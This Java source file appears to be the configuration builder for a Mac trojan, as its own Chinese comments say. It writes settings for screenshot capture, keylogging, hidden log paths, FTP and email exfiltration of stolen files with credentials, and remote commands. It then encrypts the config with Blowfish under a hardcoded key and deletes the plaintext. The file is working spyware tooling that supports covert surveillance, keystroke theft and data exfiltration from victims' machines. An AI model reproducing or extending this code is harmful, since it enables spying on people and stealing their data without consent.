package com.config;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import com.enc.Blowfish;
import com.topking.ftp.bean.UserInfoBean;
import com.topking.ftp.bean.ConfigBean;

/**
 * 配置文件生成
 * 
 * @author root input: Panel output: Config.txt
 */

public class ParseConfig implements Runnable {
	// TestConfig tc; //测试配置面板
	private String desDir;
	private UserInfoBean uib;
	private ConfigBean cfb;
	public boolean isFinish = false;

	public ParseConfig(String desDir, UserInfoBean uibean, ConfigBean cfbean) {
		this.desDir = desDir + ".txt";
		this.uib = uibean;
		this.cfb = cfbean;
	}

	public void run() {

		File file = new File(desDir);
		if (!file.getParentFile().exists()) {
			file.mkdir();
		}
		if (uib == null || cfb == null) {
			return;
		}
		try {
			FileOutputStream fos = new FileOutputStream(file);
			OutputStreamWriter output = new OutputStreamWriter(fos, "UTF-8");
			BufferedWriter bw = new BufferedWriter(output);
			{
				bw.write("# 配置文件，自动生成，请勿修改！！");
				bw.newLine();
				bw.write("# 注意请不要修改格式！");
				bw.newLine();
				bw.write("#每个参数间用“;”隔开");
				bw.newLine();
				bw.write("#");
				bw.newLine();
				bw.newLine();
			}
			{
				String ftpupdir = uib.getUserID();
				// System.out.println("ftpupdir:"+ftpupdir);
				bw.write("<个人用户名>");
				bw.newLine();
				if ((ftpupdir == null) || (ftpupdir.equals(""))) {
					bw.write("/;");
				} else {
					bw.write("/" + ftpupdir + ";");
				}
				bw.newLine();
				bw.write("</个人用户名>");
				bw.newLine();
				bw.newLine();
			}
			{
				boolean unInstall = cfb.getUnInstall();
				bw.write("<卸载程序>");// 选中则卸载木马
				bw.newLine();
				if (unInstall) {
					bw.write("true" + ";");
				} else {
					bw.write("false" + ";");
				}
				System.out.println("Uninstall:" + unInstall);
				bw.newLine();
				bw.write("</卸载程序>");
				bw.newLine();
				bw.newLine();
			}
			{
				bw.write("<屏幕截图存放路径>");
				bw.newLine();
				if (true) {
					// bw.write("/private/var/root/Library/Caches/com.apple.ScreenSaver;");
					bw.write("/;");
				}
				bw.newLine();
				bw.write("</屏幕截图存放路径>");
				bw.newLine();
				bw.newLine();
			}
			{
				boolean closeScreen = cfb.getScreenCapture();
				bw.write("<屏幕截图开关>");// 这个木马端没有
				bw.newLine();
				if (closeScreen) {
					bw.write("true" + ";");
				} else {
					bw.write("false" + ";");
				}
				System.out.println("OpenScreenCapture:" + closeScreen);
				bw.newLine();
				bw.write("</屏幕截图开关>");
				bw.newLine();
				bw.newLine();
			}
			{
				boolean closeScreenTime = cfb.getScreenTimeCapture();
				bw.write("<屏幕截图时间开关>");// 这个木马端没有
				bw.newLine();
				if (closeScreenTime) {
					bw.write("true" + ";");
				} else {
					bw.write("false" + ";");
				}
				System.out.println("OpenScreenTimeCapture:" + closeScreenTime);
				bw.newLine();
				bw.write("</屏幕截图时间开关>");
				bw.newLine();
				bw.newLine();
			}
			{
				bw.write("<屏幕截图格式>");
				bw.newLine();
				bw.write("jpg;");
				bw.newLine();
				bw.write("</屏幕截图格式>");
				bw.newLine();
				bw.newLine();
			}
			{
				String time = cfb.getIntervelScreenTime();
				// System.out.println(time);
				bw.write("<屏幕截图时间>"); // 单位为妙
				bw.newLine();
				if ((time == null) || (time.equals(""))) {
					bw.write("/30;");
				} else {
					bw.write("/" + Integer.parseInt(time) + ";");
				}
				bw.newLine();
				bw.write("</屏幕截图时间>");
				bw.newLine();
				bw.newLine();
			}
			{
				bw.write("<键盘日志存放目的地址>");
				bw.newLine();
				if (true) {
					// bw.write("/System/Library/Keyboard Layouts/AppleKeyboardLayouts.app/Contents/.keydeflog;");
					bw.write("/;");
				}
				bw.newLine();
				bw.write("</键盘日志存放目的地址>");
				bw.newLine();
				bw.newLine();
			}
			{
				boolean closeKey = cfb.getKeyBoard();
				bw.write("<键盘跟踪开关>");
				bw.newLine();
				if (closeKey) {
					bw.write("true" + ";");
				} else {
					bw.write("false" + ";");
				}
				System.out.println("OpenKeyBoard:" + closeKey);
				bw.newLine();
				bw.write("</键盘跟踪开关>");
				bw.newLine();
				bw.newLine();
			}
			{
				boolean LogKey = cfb.getLogKey();
				bw.write("<直接获取键盘开关>");
				bw.newLine();
				if (LogKey) {
					bw.write("true" + ";");
				} else {
					bw.write("false" + ";");
				}
				System.out.println("OpenLogKey:" + LogKey);
				bw.newLine();
				bw.write("</直接获取键盘开关>");
				bw.newLine();
				bw.newLine();
			}
			{
				String host = uib.getFtpUrl();
				bw.write("<FTP主机名>");
				bw.newLine();
				if ((host == null) || (host.equals(""))) {
					host = "/;";
				}
				// System.out.println("ftpUrl:"+host);
				bw.write("/" + host + ";");
				bw.newLine();
				bw.write("</FTP主机名>");
				bw.newLine();
				bw.newLine();
			}
			{
				String username = uib.getFtpName();
				bw.write("<FTP用户名>");
				bw.newLine();
				if ((username == null) || (username.equals(""))) {
					username = "/;";
				}
				bw.write("/" + username + ";");
				// System.out.println("ftpName:"+username);
				bw.newLine();
				bw.write("</FTP用户名>");
				bw.newLine();
				bw.newLine();

			}
			{
				String password = uib.getFtpPasswd();
				bw.write("<FTP密码>");
				bw.newLine();
				if ((password == null) || (password.equals(""))) {
					password = "/;";
				}
				bw.write("/" + password + ";");
				// System.out.println("ftpPasswd:"+password);
				bw.newLine();
				bw.write("</FTP密码>");
				bw.newLine();
				bw.newLine();
			}
			{
				String time = cfb.getIntervelTime();
				// System.out.println(time);
				bw.write("<FTP上传时间间隔>"); // 单位为妙
				bw.newLine();
				if ((time == null) || (time.equals(""))) {
					bw.write("/15;");
				} else {
					bw.write("/" + Integer.parseInt(time) + ";");
				}
				bw.newLine();
				bw.write("</FTP上传时间间隔>");
				bw.newLine();
				bw.newLine();
			}
			{
				bw.write("<FTP下载时间间隔>");
				bw.newLine();
				bw.write("/" + "30" + ";");
				bw.newLine();
				bw.write("</FTP下载时间间隔>");
				bw.newLine();
				bw.newLine();
			}
			{
				String ftpfilename = cfb.getRemoteFilePath();
				// System.out.println(ftpfilename);
				bw.write("<FTP上传的文件地址>"); // 获取远程文件的路径
				bw.newLine();
				if ((ftpfilename == null) || (ftpfilename.equals(""))) {
					bw.write("/;");
				} else {
					bw.write("/" + ftpfilename + ";");
				}
				bw.newLine();
				bw.write("</FTP上传的文件地址>");
				bw.newLine();
				bw.newLine();
			}
			{ // 配置文件名
				bw.write("<FTP下载的文件名>");
				bw.newLine();
				bw.write("/config;");
				bw.newLine();
				bw.write("</FTP下载的文件名>");
				bw.newLine();
				bw.newLine();
			}
			{
				String mail = cfb.getEmailURL();
				// System.out.println(mail);
				bw.write("<MAIL收件人邮箱>");
				bw.newLine();
				if ((mail == null) || (mail.equals(""))) {
					bw.write("/;");
				} else {
					bw.write("/" + mail + ";");
				}
				bw.newLine();
				bw.write("</MAIL收件人邮箱>");
				bw.newLine();
				bw.newLine();
			}
			{
				bw.write("<MAIL主题>");
				bw.newLine();
				if (true) {
					bw.write("/" + uib.getUserName() + "测试test;");
				}
				bw.newLine();
				bw.write("</MAIL主题>");
				bw.newLine();
				bw.newLine();
			}
			{
				String mailattachment = cfb.getEmailAttachment();
				// System.out.println(mailattachment);
				bw.write("<MAIL附件地址>");
				bw.newLine();
				if (mailattachment == null) {
					bw.write("/;");
				} else {
					bw.write("/" + mailattachment + ";");
				}
				bw.newLine();
				bw.write("</MAIL附件地址>");
				bw.newLine();
				bw.newLine();
			}
			{

				bw.write("<MAIL内容>");
				bw.newLine();
				if (true) {
					bw.write("/MAC测试小组，测试邮件;");
				}
				bw.newLine();
				bw.write("</MAIL内容>");
				bw.newLine();
				bw.newLine();
			}
			{
				String mailname = "MAC项目小组";
				// System.out.println(mailname);
				bw.write("<MAIL显示的发件人名称>");
				bw.newLine();
				bw.write("/" + mailname + ";");
				bw.newLine();
				bw.write("</MAIL显示的发件人名称>");
				bw.newLine();
				bw.newLine();
			}
			{
				String mailuser = cfb.getEmailName();
				// System.out.println("mailuser:"+mailuser);
				bw.write("<MAIL发件人账号>");
				bw.newLine();
				if ((mailuser == null) || (mailuser.equals(""))) {
					bw.write("/;");
				} else {
					bw.write("/" + mailuser + ";");
				}
				bw.newLine();
				bw.write("</MAIL发件人账号>");
				bw.newLine();
				bw.newLine();
			}
			{
				String mailpassword = cfb.getEmailPassWD();
				// System.out.println("-------"+mailpassword);
				bw.write("<MAIL密码>");
				bw.newLine();
				if ((mailpassword == null) || (mailpassword.equals(""))) {
					bw.write("/;");
				} else {
					bw.write("/" + mailpassword + ";");
				}
				bw.newLine();
				bw.write("</MAIL密码>");
				bw.newLine();
				bw.newLine();
			}
			{
				// String mailpop3 = MailPanel.pop3Field.getText();
				// System.out.println("---------"+mailpop3);
				bw.write("<MAILPOP3服务器>");
				bw.newLine();
				if (true) {// mailpop3.equals("")
					bw.write("/;");
					// }
					// else{
					// bw.write("/"+mailpop3+";");
				}
				bw.newLine();
				bw.write("</MAILPOP3服务器>");
				bw.newLine();
				bw.newLine();
			}
			{
				// String mailsmtp = MailPanel.smtpField.getText();
				// System.out.println("----------"+mailsmtp);
				bw.write("<MAILSMTP服务器>");
				bw.newLine();
				if (true) {// mailsmtp.equals("")
					bw.write("/;");
					// }
					// else{
					// bw.write("/"+mailsmtp+";");
				}
				bw.newLine();
				bw.write("</MAILSMTP服务器>");
				bw.newLine();
				bw.newLine();
			}
			{
				String commandline = cfb.getCommandStr();
				// System.out.println(commandline);
				bw.write("<命令行语句>");
				bw.newLine();
				if ((commandline == null) || (commandline.equals(""))
						|| (commandline.equals("null"))) {
					bw.write("/ls -alO /Users;");
				} else {
					bw.write("/" + commandline + ";");
				}

				bw.newLine();
				bw.write("</命令行语句>");
				bw.newLine();
				bw.newLine();
			}
			bw.flush();
			bw.close();
			output.close();
			fos.close();
			/**** 加密并写入文件 ****/
			FileInputStream fis = new FileInputStream(file);
			InputStreamReader is = new InputStreamReader(fis, "UTF-8");
			BufferedReader br = new BufferedReader(is);
			String str;
			StringBuffer strbuf = new StringBuffer();
			Blowfish crypt = new Blowfish("logkext");
			System.out.println("开始加密");
			while ((str = br.readLine()) != null) {
				strbuf.append("\n");
				strbuf.append(str);
			}
			br.close();
			is.close();
			fis.close();
			if (file.delete()) {
				// System.out.println(desDir + "删除成功！");
			}
			file.deleteOnExit();

			String stren = strbuf.toString();
			System.err.println(stren);
			stren = crypt.encryptString(stren);
			String[] configName = desDir.split(".txt");
			System.out.println(configName[0]);

			File file1 = new File(configName[0]);
			if (!file1.getParentFile().exists()) {
				file1.mkdir();
			}
			FileOutputStream fos1 = new FileOutputStream(file1);
			OutputStreamWriter output1 = new OutputStreamWriter(fos1, "UTF-8");
			BufferedWriter bw1 = new BufferedWriter(output1);
			bw1.write(stren);
			bw1.flush();
			bw1.close();
			output1.close();
			fos1.close();
			/**** 完成加密 ****/
			isFinish = true;
			System.out.println("加密完成");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
